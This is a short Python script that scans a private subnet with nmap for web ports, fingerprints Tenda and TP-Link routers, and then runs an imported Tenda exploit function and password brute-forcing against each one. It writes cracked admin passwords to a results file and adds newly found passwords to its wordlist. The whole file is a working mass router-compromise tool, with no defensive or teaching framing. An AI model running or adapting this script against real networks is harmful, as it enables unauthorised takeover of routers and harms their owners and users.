import tp_link
import time
import tenda
import mmh3
import xml.etree.ElementTree as ET
import subprocess
subprocess.run("sudo nmap -sS -p 8080,80 10.106.24.0/22 --open -oX result.xml".split())
f = open("common.txt", "a+")
f.seek(0)
passList = [passwd.strip() for passwd in f]
tree = ET.parse('result.xml')
root = tree.getroot()
ipList = []
for child in root:
    ports = []
    for schild in child.iter('port'):
        ports.append(schild.attrib['portid'])
    ip = list(child.iter('address'))
    if(ip):
        ip_addr = ip[0].attrib['addr']
        for port in ports:
            ipList.append(f"{ip_addr}:{port}")
failed = open("failed.txt", "w")
result = open("results.txt", "w")
# ipList = ["10.106.27.80:8080", "10.106.20.21:8080"]
for ip in ipList:
    passwd = ""

    if(tenda.is_tenda(f"http://{ip}")):
        print("Tenda found")
        passwd = tenda.tenda_exploiter(ip)
        if not passwd:
            passwd = tenda.tenda_brute(ip, passList)
        
    elif(tp_link.is_tplink(ip)):
        print("TP-Link found")
        passwd = tp_link.tp_bruter(ip, passList)
    
    if not passwd:
        failed.write(ip)
        failed.write('\n')
        continue
    else:
        result.write(f"{ip} : {passwd}\n")
    # if the pass is new add to common list
    if passwd not in passList and passwd != None:
        print(passwd)
        f.write("\n")
        f.write(passwd)
